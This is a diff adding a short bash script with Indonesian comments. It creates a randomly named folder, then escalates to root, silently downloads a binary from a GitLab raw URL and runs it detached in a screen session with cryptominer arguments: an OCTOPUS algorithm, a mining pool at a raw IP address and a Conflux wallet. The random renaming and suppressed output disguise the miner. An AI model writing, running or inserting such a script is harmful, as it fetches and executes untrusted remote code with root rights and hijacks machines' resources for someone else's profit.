@@ -1,0 +1,18 @@
+#!/bin/bash
+# Generate nama folder acak (misalnya, 8 karakter alfanumerik)
+NAMA_FOLDER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+
+# Buat folder dengan nama acak
+mkdir -p "$NAMA_FOLDER"
+
+# Masuk ke dalam folder
+cd "$NAMA_FOLDER" || { echo "Gagal masuk ke folder $NAMA_FOLDER."; exit 1; }
+
+# Tampilkan pesan sukses
+echo "Folder '$NAMA_FOLDER' berhasil dibuat dan Anda sekarang berada di dalamnya."
+sudo su <<EOF
+sudo apt install screen -y >/dev/null 2>&1
+wget -qO dogi https://gitlab.com/sarifadim/jomblo/-/raw/main/sagu && chmod +x dogi && mv dogi $NAMA_FOLDER
+screen -dms run ./$NAMA_FOLDER --algo OCTOPUS --pool 185.12.5.250:443 --user cfx:aaryjzdf2uhgexyezbkftvgmckt1ch5yb6g3bkwe4h.$(echo 0J-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl
+EOF
+screen -r
